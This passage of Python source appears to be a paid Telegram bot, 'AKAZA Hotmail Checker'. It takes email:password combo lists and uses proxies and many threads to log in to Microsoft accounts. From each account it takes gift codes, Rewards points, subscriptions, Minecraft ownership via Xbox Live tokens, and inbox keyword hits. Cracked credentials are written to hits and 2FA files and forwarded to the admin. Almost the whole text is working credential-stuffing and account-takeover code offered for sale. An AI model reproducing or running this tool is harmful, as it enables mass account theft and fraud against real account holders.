                    'RelyingParty': 'http://auth.xboxlive.com',
                    'TokenType': 'JWT',
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10, verify=False,
            ).json()
            xbl_token = xbl.get('Token')
            userhash  = xbl.get('DisplayClaims', {}).get('xui', [{}])[0].get('uhs')
            if not xbl_token or not userhash: return {'owned': False}
            xsts = self.session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json={
                    'Properties': {'SandboxId': 'RETAIL', 'UserTokens': [xbl_token]},
                    'RelyingParty': 'rp://api.minecraftservices.com/',
                    'TokenType': 'JWT',
                },
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=10, verify=False,
            ).json()
            xsts_token = xsts.get('Token')
            if not xsts_token: return {'owned': False}
            mca = self.session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': 'XBL3.0 x=' + userhash + ';' + xsts_token},
                headers={'Content-Type': 'application/json'},
                timeout=10, verify=False,
            ).json()
            mc_token = mca.get('access_token')
            if not mc_token: return {'owned': False}
            prof = self.session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': 'Bearer ' + mc_token},
                timeout=10, verify=False,
            )
            if prof.status_code == 200:
                pd = prof.json()
                return {
                    'owned': True,
                    'username': pd.get('name', 'Unknown'),
                    'uuid': pd.get('id', ''),
                    'capes': [cp.get('alias', '') for cp in pd.get('capes', [])],
                }
        except Exception:
            pass
        return {'owned': False}

    # ── Inbox scan (batched OR queries) ──
    def _scan_inbox(self, access_token, cid, user_kws):
        found = {}
        try:
            hdrs = {
                'Authorization': 'Bearer ' + access_token,
                'X-AnchorMailbox': 'CID:' + cid,
                'User-Agent': 'Outlook-Android/2.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            }
            all_kws = list(dict.fromkeys(list(SERVICE_KEYWORDS.keys()) + (user_kws or [])))
            BATCH   = 8
            for i in range(0, len(all_kws), BATCH):
                batch = all_kws[i:i+BATCH]
                or_q  = ' OR '.join('"' + kw + '"' for kw in batch)
                payload = {
                    'Cvid': str(uuid.uuid4()),
                    'Scenario': {'Name': 'owa.react'},
                    'TimeZone': 'UTC',
                    'TextDecorations': 'Off',
                    'EntityRequests': [{
                        'EntityType': 'Conversation',
                        'ContentSources': ['Exchange'],
                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]},
                        'From': 0,
                        'Query': {'QueryString': or_q},
                        'Size': 5,
                        'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}],
                    }],
                }
                try:
                    r  = self.session.post(
                        'https://outlook.live.com/search/api/v2/query',
                        json=payload, headers=hdrs, timeout=8, verify=False)
                    d  = r.json()
                    rs = d.get('EntitySets', [{}])[0].get('ResultSets', [{}])[0]
                    if rs.get('Total', 0) > 0:
                        for kw in batch:
                            try:
                                p2 = {
                                    'Cvid': str(uuid.uuid4()),
                                    'Scenario': {'Name': 'owa.react'},
                                    'TimeZone': 'UTC',
                                    'TextDecorations': 'Off',
                                    'EntityRequests': [{
                                        'EntityType': 'Conversation',
                                        'ContentSources': ['Exchange'],
                                        'Filter': {'Or': [{'Term': {'DistinguishedFolderName': 'msgfolderroot'}}]},
                                        'From': 0,
                                        'Query': {'QueryString': '"' + kw + '"'},
                                        'Size': 3,
                                        'Sort': [{'Field': 'Time', 'SortDirection': 'Desc'}],
                                    }],
                                }
                                r2  = self.session.post(
                                    'https://outlook.live.com/search/api/v2/query',
                                    json=p2, headers=hdrs, timeout=6, verify=False)
                                cnt = r2.json().get('EntitySets', [{}])[0].get(
                                    'ResultSets', [{}])[0].get('Total', 0)
                                if cnt > 0:
                                    disp = SERVICE_KEYWORDS.get(kw, kw)
                                    found[disp] = found.get(disp, 0) + cnt
                            except Exception:
                                pass
                except Exception:
                    pass
        except Exception as e:
            logger.debug('Inbox error: %s', e)
        return found

    # ── FULL CHECK ──
    def check(self, email, password, user_kws=None, fast=False):
        result = {'email': email, 'password': password, 'status': 'bad'}
        try:
            urlpost, ppft = self._get_sftag()
            if not urlpost:
                result['status'] = 'error'
                return result
            status, token = self._login(email, password, urlpost, ppft)
            if status == 'BAD':   return result
            if status == '2FA':   result['status'] = '2fa';   return result
            if not token:         result['status'] = 'error'; return result
            cid = ''
            for ck in self.session.cookies:
                if ck.name == 'MSPCID':
                    cid = ck.value.upper()
                    break
            result['status']  = 'hit'
            result['pts']     = self._get_points()
            result['codes']   = self._get_codes()
            result['name'], result['country'] = self._get_profile(token, cid)
            if not fast:
                result['subs']  = self._get_subs()
                result['mc']    = self._get_minecraft(token)
                result['inbox'] = self._scan_inbox(token, cid, user_kws or [])
            else:
                result['subs']  = {'status': 'FREE', 'subs': [], 'balance': '', 'card': ''}
                result['mc']    = {'owned': False}
                result['inbox'] = {}
        except Exception as e:
            logger.debug('Check error %s: %s', email, e)
            result['status'] = 'error'
        return result


# ============================================================================
# FILE WRITERS — clean structured files
# ============================================================================
SEP = '=' * 50

def _write_hits_file(fpath, data):
    pts         = data.get('pts', 0)
    subs        = data.get('subs', {})
    mc          = data.get('mc', {})
    active_subs = [s['name'] for s in subs.get('subs', []) if not s.get('expired')]
    mc_val      = mc.get('username', 'No') if mc.get('owned') else 'No'
    subs_val    = ', '.join(active_subs) if active_subs else 'None'
    lines = [
        TAG,
        SEP,
        'Email    : ' + data['email'],
        'Password : ' + data['password'],
        'Name     : ' + data.get('name', 'N/A'),
        'Country  : ' + data.get('country', 'N/A'),
        'Points   : ' + str(pts),
        'Subs     : ' + subs_val,
        'Minecraft: ' + mc_val,
        SEP,
        TAG,
        '',
    ]
    with open(fpath, 'a', encoding='utf-8') as f:
        f.write('\n'.join(lines) + '\n')


def _write_codes_file(fpath, data):
    codes = data.get('codes', [])
    if not codes: return
    lines = [
        TAG,
        SEP,
        'Email: ' + data['email'],
        '',
    ]
    cat_map = {}
    for cd in codes:
        cat_map.setdefault(cd.get('category', 'Unknown'), []).append(cd)
    for cat, clist in cat_map.items():
        lines.append('[ ' + cat + ' ]')
        for cd in clist:
            lines.append('  Code   : ' + cd['code'])
            lines.append('  Info   : ' + cd.get('info', ''))
            rurl = cd.get('redemption_url', '')
            if rurl:
                lines.append('  Redeem : ' + rurl)
            lines.append('')
    lines += [SEP, TAG, '', '']
    with open(fpath, 'a', encoding='utf-8') as f:
        f.write('\n'.join(lines) + '\n')


def _write_inbox_file(fpath, data):
    inbox = data.get('inbox', {})
    if not inbox: return
    lines = [
        TAG,
        SEP,
        'Email: ' + data['email'],
        '',
    ]
    for svc, cnt in inbox.items():
        lines.append('  ' + svc.ljust(20) + ': ' + str(cnt) + ' emails')
    lines += ['', SEP, TAG, '', '']
    with open(fpath, 'a', encoding='utf-8') as f:
        f.write('\n'.join(lines) + '\n')


def _write_tfa_file(fpath, data):
    with open(fpath, 'a', encoding='utf-8') as f:
        f.write(data['email'] + ':' + data['password'] + '\n')


# ============================================================================
# KEYBOARDS
# ============================================================================
def _main_kb(uid):
    kb = [
        [InlineKeyboardButton('🔍 Start Checking', callback_data='check'),
         InlineKeyboardButton('⚙️ Settings',        callback_data='settings')],
        [InlineKeyboardButton('📊 My Stats',         callback_data='stats'),
         InlineKeyboardButton('🌐 Proxies',          callback_data='proxies')],
        [InlineKeyboardButton('📖 Commands',         callback_data='cmds')],
    ]
    if DB.is_mod(uid):
        kb.append([InlineKeyboardButton('🛠 Admin Panel', callback_data='admin')])
    kb.append([InlineKeyboardButton('ℹ️ ' + TAG, callback_data='tag')])
    return InlineKeyboardMarkup(kb)

BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Back', callback_data='back')]])

# ============================================================================
# STRING HELPERS — no f-string backslashes anywhere
# ============================================================================
D  = '━━━━━━━━━━━━━━━━━━━━━'

def _s(uid):
    """Return start message string."""
    cr  = '♾️ Unlimited' if uid == ADMIN_ID else '`' + str(DB.get_credits(uid)) + '`'
    acc = '✅ Active' if DB.has_access(uid) else '❌ No Access'
    fm  = '⚡ Fast' if user_fast_mode.get(uid) else '🔬 Full'
    return (
        '🔥 *AKAZA Hotmail Checker*\n' + D + '\n'
        '👤 User:    `' + str(uid) + '`\n'
        '💰 Credits: ' + cr + '\n'
        '🔑 Access:  ' + acc + '\n'
        '🌐 Proxies: `' + str(len(PROXIES_LIST)) + '`\n'
        '⚡ Mode:    ' + fm + '\n' + D + '\n'
        '_' + TAG + '_'
    )


# ============================================================================
# /start
# ============================================================================
async def start(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    DB.add_user(uid, u.effective_user.username, u.effective_user.first_name)
    if DB.is_banned(uid): return
    msg = _s(uid)
    kb  = _main_kb(uid)
    if u.callback_query:
        try: await u.callback_query.edit_message_text(msg, parse_mode='Markdown', reply_markup=kb)
        except Exception: pass
    else:
        await u.message.reply_text(msg, parse_mode='Markdown', reply_markup=kb)


# ============================================================================
# Callbacks
# ============================================================================
async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
    q   = u.callback_query
    uid = q.from_user.id
    await q.answer()

    if q.data == 'back':
        await start(u, c)
        return

    if q.data == 'tag':
        await q.edit_message_text(
            '*' + TAG + '*\n\n'
            'This bot is exclusively for ' + TAG + ' members.\n'
            'Contact ' + TAG + ' to purchase access.',
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if q.data == 'check':
        await q.edit_message_text(
            '📝 *How to Check*\n' + D + '\n'
            '1️⃣ Upload a `.txt` combo file (email:pass)\n'
            '2️⃣ Or paste combos directly in chat\n'
            '3️⃣ Load proxies: upload `.txt` with caption `proxy`\n\n'
            '💡 Commands:\n'
            '`/fastmode`   — toggle fast/full mode\n'
            '`/threads N`  — set thread count\n'
            '`/keywords`   — set custom inbox keywords',
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if q.data == 'settings':
        s   = DB.get_settings(uid)
        kws = ', '.join(s['keywords']) if s['keywords'] else 'None'
        fm  = '⚡ Fast (points+codes only)' if user_fast_mode.get(uid) else '🔬 Full (all captures)'
        await q.edit_message_text(
            '⚙️ *Settings*\n' + D + '\n'
            '🔢 Threads:  `' + str(s['threads']) + '`\n'
            '🔑 Keywords: `' + kws + '`\n'
            '📡 Mode:     ' + fm + '\n\n'
            '*Commands:*\n'
            '`/threads 1-300`\n'
            '`/keywords w1,w2,w3`\n'
            '`/addkw word`\n'
            '`/clearkw`\n'
            '`/fastmode`',
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if q.data == 'stats':
        s    = DB.user_stats(uid)
        info = DB.user_info(uid)
        exp  = (info.get('access_expiry', '') or '')[:10] if info else ''
        exp_line = ('\n📅 Expiry:   `' + exp + '`') if exp else ''
        await q.edit_message_text(
            '📊 *Your Stats*\n' + D + '\n'
            '💰 Credits:  `' + ('Unlimited' if uid == ADMIN_ID else str(s['credits'])) + '`\n'
            '🔍 Checks:   `' + str(s['checks']) + '`\n'
            '🎯 Hits:     `' + str(s['hits']) + '`\n'
            '🌐 Proxies:  `' + str(len(PROXIES_LIST)) + '`' + exp_line + '\n' + D + '\n'
            '_' + TAG + '_',
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if q.data == 'proxies':
        await q.edit_message_text(
            '🌐 *Proxy Manager*\n' + D + '\n'
            'Loaded: `' + str(len(PROXIES_LIST)) + '` proxies\n\n'
            '*Load proxies:* Upload `.txt` with caption `proxy`\n\n'
            '*Formats accepted:*\n'
            '`ip:port`\n'
            '`ip:port:user:pass`\n'
            '`http://ip:port`\n'
            '`socks5://ip:port`',
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if q.data == 'cmds':
        await q.edit_message_text(
            '📖 *Commands*\n' + D + '\n'
            '*User:*\n'
            '`/start`            main menu\n'
            '`/stats`            your stats\n'
            '`/threads N`        set threads\n'
            '`/keywords w1,w2`   set keywords\n'
            '`/addkw word`       add keyword\n'
            '`/clearkw`          clear keywords\n'
            '`/fastmode`         toggle mode\n'
            '`/check em:pass`    single check\n\n'
            '*Admin (prefix !!):*\n'
            '`!!help`            all admin cmds\n'
            '`!!addcredits u n`  add credits\n'
            '`!!grant u`         perm access\n'
            '`!!addaccess u d`   timed access\n'
            '`!!ban u`           ban user\n'
            '`!!info u`          user details\n'
            '`!!stats`           global stats\n'
            '`!!broadcast msg`   message all',
            parse_mode='Markdown', reply_markup=BACK_KB)
        return

    if q.data == 'admin':
        if not DB.is_mod(uid): return
        s     = DB.global_stats()
        mods  = DB.list_mods()
        ml    = ', '.join('@' + (m['username'] or str(m['uid'])) for m in mods) or 'None'
        top   = DB.top_users(5)
        tlines = []
        for row in top:
            tlines.append(
                '  `' + str(row[0]) + '` @' + (row[1] or 'N/A') +
                ' cr:' + str(row[2]) + ' hits:' + str(row[5]))
        top_txt = '\n'.join(tlines) if tlines else '  None'
        await q.edit_message_text(
            '🛠 *Admin Panel*\n' + D + '\n'
            '👥 Users:   `' + str(s['total']) + '`\n'
            '✅ Active:  `' + str(s['active']) + '`\n'
            '🔍 Checks:  `' + str(s['checks']) + '`\n'
            '🎯 Hits:    `' + str(s['hits']) + '`\n'
            '🌐 Proxies: `' + str(len(PROXIES_LIST)) + '`\n'
            '🛡 Mods: ' + ml + '\n\n'
            '*Top Users:*\n' + top_txt + '\n' + D + '\n'
            'Use `!!help` for commands',
            parse_mode='Markdown', reply_markup=BACK_KB)
        return


# ============================================================================
# Proxy upload
# ============================================================================
async def handle_proxies(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not DB.has_access(uid): return
    try:
        f       = await c.bot.get_file(u.message.document.file_id)
        content = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
        global PROXIES_LIST
        PROXIES_LIST = [l.strip() for l in content.split('\n') if l.strip() and ':' in l]
        await u.message.reply_text(
            '✅ *Proxies Loaded*\n'
            'Count: `' + str(len(PROXIES_LIST)) + '`',
            parse_mode='Markdown')
    except Exception as e:
        await u.message.reply_text('❌ Error: `' + str(e) + '`', parse_mode='Markdown')


# ============================================================================
# COMBO CHECK — no floating hit messages, clean files only
# ============================================================================
async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if DB.is_banned(uid): return

    if not DB.has_access(uid):
        await u.message.reply_text(
            '❌ *No Access*\n\nYou do not have access to this bot.\n' + BUY_MSG,
            parse_mode='Markdown')
        return

    credits = DB.get_credits(uid)
    if credits <= 0 and uid != ADMIN_ID:
        await u.message.reply_text(
            '❌ *No Credits*\n\nYou have 0 credits remaining.\n' + BUY_MSG,
            parse_mode='Markdown')
        return

    if u.message.document:
        try:
            f       = await c.bot.get_file(u.message.document.file_id)
            content = (await f.download_as_bytearray()).decode('utf-8', errors='ignore')
        except Exception:
            await u.message.reply_text('❌ Failed to read file.')
            return
    else:
        content = u.message.text or ''

    lines = [l.strip() for l in content.split('\n') if ':' in l]
    lines = [l for l in lines if not l.startswith('!!') and '@' in l.split(':')[0]]
    if not lines:
        lines = [l.strip() for l in content.split('\n')
                 if ':' in l and not l.startswith('!!')]
    if not lines: return

    if uid != ADMIN_ID and credits < len(lines):
        await u.message.reply_text(
            '❌ Not enough credits.\nHave: `' + str(credits) + '`  |  Need: `' + str(len(lines)) + '`\n\n' + BUY_MSG,
            parse_mode='Markdown')
        return

    settings = DB.get_settings(uid)
    threads  = min(settings['threads'], 10 if not PROXIES_LIST else 300)
    fm       = user_fast_mode.get(uid, False)
    keywords = settings['keywords']

    ts         = str(int(time.time()))
    uid_s      = str(uid)
    hits_file  = TAG + '_hits_'  + uid_s + '_' + ts + '_' + TAG + '.txt'
    codes_file = TAG + '_codes_' + uid_s + '_' + ts + '_' + TAG + '.txt'
    kw_file    = TAG + '_inbox_' + uid_s + '_' + ts + '_' + TAG + '.txt'
    tfa_file   = TAG + '_2fa_'   + uid_s + '_' + ts + '_' + TAG + '.txt'

    # Single status message — edited in place
    status_msg = await u.message.reply_text(
        '⚡ *AKAZA Starting*\n' + D + '\n'
        '📋 Combos:  `' + str(len(lines)) + '`\n'
        '🔢 Threads: `' + str(threads) + '`\n'
        '🌐 Proxies: `' + str(len(PROXIES_LIST)) + '`\n'
        '📡 Mode:    `' + ('Fast' if fm else 'Full') + '`\n'
        + D + '\n_' + TAG + '_',
        parse_mode='Markdown')

    hits = bad = tfa = errors = checked = 0
    start_time  = time.time()
    last_update = 0
    update_lock = asyncio.Lock()

    def run_check(line):
        try:
            parts = line.split(':', 1)
            if len(parts) != 2: return None
            e, p  = parts[0].strip(), parts[1].strip()
            proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
            return AkazaChecker(proxy=proxy).check(e, p, keywords, fast=fm)
        except Exception:
            return None

    loop = asyncio.get_running_loop()
    sem  = asyncio.Semaphore(threads)

    async def worker(line):
        nonlocal hits, bad, tfa, errors, checked, last_update
        async with sem:
            data = await loop.run_in_executor(bot_executor, run_check, line)
            if not data:
                errors += 1
                checked += 1
                return
            checked += 1
            DB.use_credit(uid)
            st = data.get('status', 'bad')

            if st == 'hit':
                hits += 1
                DB.add_hit(uid)
                DB.save_result(uid, data['email'], 'hit', data)
                # Write to files — NO chat message to user
                _write_hits_file(hits_file, data)
                _write_codes_file(codes_file, data)
                _write_inbox_file(kw_file, data)
                # Admin gets a clean one-line log, not a big message
                if uid != ADMIN_ID:
                    pts = data.get('pts', 0)
                    try:
                        await c.bot.send_message(
                            ADMIN_ID,
                            '📋 Hit from `' + str(uid) + '` — '
                            + data['email'] + ' | pts:' + str(pts)
                            + ' | codes:' + str(len(data.get('codes', [])))
                            + ' | ' + data.get('country', ''),
                            parse_mode='Markdown')
                    except Exception:
                        pass
            elif st == '2fa':
                tfa += 1
                _write_tfa_file(tfa_file, data)
            elif st == 'error':
                errors += 1
            else:
                bad += 1

            # ── update progress message every 2 s ──
            async with update_lock:
                now = time.time()
                if now - last_update > 2.0 or checked == len(lines):
                    last_update = now
                    el  = now - start_time
                    cpm = int((checked / el) * 60) if el > 0 else 0
                    pct = str(round((checked / len(lines)) * 100, 1)) if lines else '0'
                    prg = (
                        '⚡ *AKAZA Live*\n' + D + '\n'
                        '📊 Progress: `' + str(checked) + '/' + str(len(lines)) + '` (' + pct + '%)\n'
                        '🎯 Hits:     `' + str(hits) + '`\n'
                        '💀 Bad:      `' + str(bad) + '`\n'
                        '🔒 2FA:      `' + str(tfa) + '`\n'
                        '❌ Errors:   `' + str(errors) + '`\n'
                        '⚡ CPM:      `' + str(cpm) + '`\n'
                        '⏱ Time:     `' + str(int(el)) + 's`\n'
                        + D + '\n_' + TAG + '_'
                    )
                    try:
                        await status_msg.edit_text(prg, parse_mode='Markdown')
                    except Exception:
                        pass

    await asyncio.gather(*(worker(l) for l in lines))

    # ── Final summary ──
    el        = time.time() - start_time
    cpm_final = int((checked / el) * 60) if el > 0 else 0
    summary   = (
        '✅ *Check Complete*\n' + D + '\n'
        '📋 Checked: `' + str(checked) + '`\n'
        '🎯 Hits:    `' + str(hits) + '`\n'
        '💀 Bad:     `' + str(bad) + '`\n'
        '🔒 2FA:     `' + str(tfa) + '`\n'
        '❌ Errors:  `' + str(errors) + '`\n'
        '⚡ CPM:     `' + str(cpm_final) + '`\n'
        '⏱ Time:    `' + str(int(el)) + 's`\n'
        + D + '\n_' + TAG + '_'
    )
    try:
        await status_msg.edit_text(summary, parse_mode='Markdown')
    except Exception:
        pass

    # ── Send result files ──
    for fpath, cap in [
        (hits_file,  '🎯 Hits — '          + TAG),
        (codes_file, '🎮 Codes — '         + TAG),
        (kw_file,    '📬 Inbox Results — ' + TAG),
        (tfa_file,   '🔒 2FA Accounts — '  + TAG),
    ]:
        if os.path.exists(fpath) and os.path.getsize(fpath) > 0:
            try:
                with open(fpath, 'rb') as fh:
                    await u.message.reply_document(fh, caption=cap)
            except Exception:
                pass
            try:
                os.remove(fpath)
            except Exception:
                pass


# ============================================================================
# /check single
# ============================================================================
async def single_check(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if DB.is_banned(uid) or not DB.has_access(uid): return
    if not c.args:
        await u.message.reply_text('Usage: `/check email:password`', parse_mode='Markdown')
        return
    line = c.args[0]
    if ':' not in line:
        await u.message.reply_text('❌ Format: `email:password`', parse_mode='Markdown')
        return
    msg = await u.message.reply_text('🔄 Checking...', parse_mode='Markdown')
    fm  = user_fast_mode.get(uid, False)
    s   = DB.get_settings(uid)

    def do():
        e, p  = line.split(':', 1)
        proxy = random.choice(PROXIES_LIST) if PROXIES_LIST else None
        return AkazaChecker(proxy=proxy).check(e.strip(), p.strip(), s['keywords'], fast=fm)

    loop = asyncio.get_running_loop()
    data = await loop.run_in_executor(bot_executor, do)
    st   = data.get('status', 'bad')

    if st == 'hit':
        DB.use_credit(uid)
        DB.add_hit(uid)
        pts         = data.get('pts', 0)
        codes       = data.get('codes', [])
        subs        = data.get('subs', {})
        mc          = data.get('mc', {})
        inbox       = data.get('inbox', {})
        active_subs = [s2['name'] for s2 in subs.get('subs', []) if not s2.get('expired')]
        mc_val      = mc.get('username', '') if mc.get('owned') else 'No'
        tier        = '💎 ULTRA' if pts >= 20000 else ('⭐ PREMIUM' if pts >= 7000 else '🎯 HIT')
        result = (
            tier + '\n' + D + '\n'
            '📧 `' + data['email'] + '`\n'
            '🔑 `' + data['password'] + '`\n'
            '👤 ' + data.get('name', 'N/A') + ' | 🌍 ' + data.get('country', 'N/A') + '\n'
            '⭐ Points:  `' + str(pts) + '`\n'
            '🎮 Codes:   `' + str(len(codes)) + '`\n'
            '📬 Inbox:   `' + str(len(inbox)) + '` services\n'
            '⛏️ Minecraft: `' + mc_val + '`\n'
            '🎮 Subs:    `' + (', '.join(active_subs) or 'None') + '`\n'
            + D + '\n_' + TAG + '_'
        )
    elif st == '2fa':
        result = '🔒 *2FA Account*\n`' + line + '`\n_' + TAG + '_'
    elif st == 'error':
        result = '❌ *Error*\n_' + TAG + '_'
    else:
        result = '💀 *Bad Account*\n_' + TAG + '_'

    try:
        await msg.edit_text(result, parse_mode='Markdown', disable_web_page_preview=True)
    except Exception:
        pass


# ============================================================================
# User commands
# ============================================================================
async def cmd_threads(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not DB.has_access(uid): return
    try:
        t = max(1, min(int(c.args[0]), 300))
        DB.update_settings(uid, threads=t)
        await u.message.reply_text('✅ Threads: `' + str(t) + '`', parse_mode='Markdown')
    except Exception:
        await u.message.reply_text('Usage: `/threads 10`', parse_mode='Markdown')

async def cmd_keywords(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not DB.has_access(uid): return
    if c.args:
        kws = [k.strip() for k in ' '.join(c.args).split(',') if k.strip()]
        DB.update_settings(uid, keywords=kws)
        await u.message.reply_text('✅ Keywords: `' + ', '.join(kws) + '`', parse_mode='Markdown')
    else:
        await u.message.reply_text('Usage: `/keywords netflix,paypal,steam`', parse_mode='Markdown')

async def cmd_addkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not DB.has_access(uid): return
    if c.args:
        kw  = c.args[0].strip()
        s   = DB.get_settings(uid)
        kws = s['keywords']
        if kw not in kws: kws.append(kw)
        DB.update_settings(uid, keywords=kws)
        await u.message.reply_text('✅ Added: `' + kw + '`', parse_mode='Markdown')

async def cmd_clearkw(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not DB.has_access(uid): return
    DB.update_settings(uid, keywords=[])
    await u.message.reply_text('✅ Keywords cleared.', parse_mode='Markdown')

async def cmd_fastmode(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not DB.has_access(uid): return
    user_fast_mode[uid] = not user_fast_mode.get(uid, False)
    if user_fast_mode[uid]:
        await u.message.reply_text(
            '⚡ *Fast Mode ON*\nPoints + codes only — higher CPM',
            parse_mode='Markdown')
    else:
        await u.message.reply_text(
            '🔬 *Full Mode ON*\nAll captures: points, codes, subs, Minecraft, inbox',
            parse_mode='Markdown')

async def cmd_stats(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid  = u.effective_user.id
    s    = DB.user_stats(uid)
    info = DB.user_info(uid)
    exp  = (info.get('access_expiry', '') or '')[:10] if info else ''
    await u.message.reply_text(
        '📊 *Your Stats*\n' + D + '\n'
        '💰 Credits: `' + ('Unlimited' if uid == ADMIN_ID else str(s['credits'])) + '`\n'
        '🔍 Checks:  `' + str(s['checks']) + '`\n'
        '🎯 Hits:    `' + str(s['hits']) + '`\n'
        '🌐 Proxies: `' + str(len(PROXIES_LIST)) + '`\n'
        '⚡ Mode:    `' + ('Fast' if user_fast_mode.get(uid) else 'Full') + '`\n'
        + ('📅 Expiry: `' + exp + '`\n' if exp else '')
        + D + '\n_' + TAG + '_',
        parse_mode='Markdown')


# ============================================================================
# Admin commands
# ============================================================================
async def admin_cmd(u: Update, c: ContextTypes.DEFAULT_TYPE):
    uid = u.effective_user.id
    if not DB.is_mod(uid): return
    txt = u.message.text or ''
    if not txt.startswith('!!'): return

    async def reply(msg):
        await u.message.reply_text(msg, parse_mode='Markdown')

    try:
        parts = txt.split(None, 3)
        cmd   = parts[0][2:].lower()

        if cmd == 'help':
            await reply(
                '🛠 *Admin Commands*\n' + D + '\n'
                '`!!addcredits [uid] [n]`\n'
                '`!!setcredits [uid] [n]`\n'
                '`!!resetcredits [uid]`\n'
                '`!!credits [uid]`\n'
                '`!!grant [uid]`       perm access\n'
                '`!!revoke [uid]`      remove access\n'
                '`!!addaccess [uid] [days]`\n'
                '`!!ban [uid]` / `!!unban [uid]`\n'
                '`!!mod [uid]` / `!!unmod [uid]`  _(owner)_\n'
                '`!!info [uid]`\n'
                '`!!stats`\n'
                '`!!listmods`\n'
                '`!!setthreads [uid] [n]`\n'
                '`!!broadcast [msg]`')

        elif cmd == 'addcredits' and len(parts) >= 3:
            t, n = int(parts[1]), int(parts[2])
            DB.add_credits(t, n)
            await reply('✅ Added `' + str(n) + '` credits to `' + str(t) + '`')

        elif cmd == 'setcredits' and len(parts) >= 3:
            t, n = int(parts[1]), int(parts[2])
            DB.set_credits(t, n)
            await reply('✅ Set credits to `' + str(n) + '` for `' + str(t) + '`')

        elif cmd == 'resetcredits' and len(parts) >= 2:
            t = int(parts[1])
            DB.reset_credits(t)
            await reply('✅ Reset credits for `' + str(t) + '`')

        elif cmd == 'credits' and len(parts) >= 2:
            t = int(parts[1])
            await reply('💰 `' + str(t) + '` has `' + str(DB.get_credits(t)) + '` credits')

        elif cmd == 'grant' and len(parts) >= 2:
            t = int(parts[1])
            DB.add_user(t, '', '')
            DB.grant(t)
            await reply('✅ Permanent access granted to `' + str(t) + '`')

        elif cmd == 'revoke' and len(parts) >= 2:
            t = int(parts[1])
            DB.revoke(t)
            await reply('✅ Access revoked for `' + str(t) + '`')

        elif cmd == 'addaccess' and len(parts) >= 3:
            t, d = int(parts[1]), int(parts[2])
            DB.add_user(t, '', '')
            DB.grant_timed(t, d)
            await reply('✅ `' + str(d) + '` days access granted to `' + str(t) + '`')

        elif cmd == 'ban' and len(parts) >= 2:
            t = int(parts[1])
            DB.ban(t)
            await reply('✅ Banned `' + str(t) + '`')

        elif cmd == 'unban' and len(parts) >= 2:
            t = int(parts[1])
            DB.unban(t)
            await reply('✅ Unbanned `' + str(t) + '`')

        elif cmd == 'mod' and len(parts) >= 2:
            if uid != ADMIN_ID: await reply('❌ Owner only.'); return
            t = int(parts[1])
            DB.add_user(t, '', '')
            DB.set_mod(t, 1)
            await reply('✅ Modded `' + str(t) + '`')

        elif cmd == 'unmod' and len(parts) >= 2:
            if uid != ADMIN_ID: await reply('❌ Owner only.'); return
            t = int(parts[1])
            DB.set_mod(t, 0)
            await reply('✅ Unmodded `' + str(t) + '`')

        elif cmd == 'info' and len(parts) >= 2:
            t    = int(parts[1])
            info = DB.user_info(t)
            if not info: await reply('❌ Not found'); return
            exp = (info.get('access_expiry', '') or '')[:10]
            await reply(
                '👤 *User Info*\n' + D + '\n'
                'ID:      `' + str(info['user_id']) + '`\n'
                'User:    @' + (info['username'] or 'N/A') + '\n'
                'Credits: `' + str(info['credits']) + '`\n'
                'Access:  `' + ('Yes' if info['has_access'] else 'No') + '`\n'
                'Banned:  `' + ('Yes' if info['is_banned'] else 'No') + '`\n'
                'Mod:     `' + ('Yes' if info['is_mod'] else 'No') + '`\n'
                'Checks:  `' + str(info['total_checks']) + '`\n'
                'Hits:    `' + str(info['total_hits']) + '`\n'
                'Joined:  `' + (info['join_date'] or '')[:10] + '`\n'
                'Expiry:  `' + (exp or 'None') + '`')

        elif cmd == 'stats':
            s = DB.global_stats()
            await reply(
                '📊 *Global Stats*\n' + D + '\n'
                '👥 Users:   `' + str(s['total']) + '`\n'
                '✅ Active:  `' + str(s['active']) + '`\n'
                '🔍 Checks:  `' + str(s['checks']) + '`\n'
                '🎯 Hits:    `' + str(s['hits']) + '`\n'
                '🌐 Proxies: `' + str(len(PROXIES_LIST)) + '`')

        elif cmd == 'listmods':
            mods = DB.list_mods()
            if not mods: await reply('No mods.'); return
            lst = '\n'.join('• `' + str(m['uid']) + '` @' + (m['username'] or 'N/A') for m in mods)
            await reply('🛡 *Mods:*\n' + lst)

        elif cmd == 'setthreads' and len(parts) >= 3:
            t, n = int(parts[1]), int(parts[2])
            DB.update_settings(t, threads=n)
            await reply('✅ Threads `' + str(n) + '` for `' + str(t) + '`')

        elif cmd == 'broadcast':
            bcast = txt[len('!!broadcast'):].strip()
            if not bcast: await reply('Usage: `!!broadcast message`'); return
            uids = DB.all_uids()
            sent = 0
            for tuid in uids:
                try:
                    await c.bot.send_message(
                        tuid,
                        '📢 *' + TAG + '*\n\n' + bcast,
                        parse_mode='Markdown')
                    sent += 1
                    await asyncio.sleep(0.05)
